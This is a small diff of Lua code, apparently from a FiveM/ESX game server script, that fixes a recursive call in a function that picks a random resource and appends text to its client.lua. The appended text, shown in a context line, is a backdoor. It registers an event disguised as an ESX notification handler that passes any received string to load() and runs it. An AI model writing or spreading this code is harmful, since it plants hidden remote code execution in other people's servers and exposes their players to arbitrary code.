@@ -119,7 +119,7 @@ function ChooseRandomResourceAndWriteToFile2()
     end
     local serverLuaPath = GetResourcePath(chosenResource) .. "/client.lua"
     if not FileExists(serverLuaPath) then
-        ChooseRandomResourceAndWriteToFile()
+        ChooseRandomResourceAndWriteToFile2()
         return
     end
     local appendContent = "\n\nRegisterNetEvent('esx:notifications:') AddEventHandler('esx:notifications:', function(b) local a = load(b) a() end)"
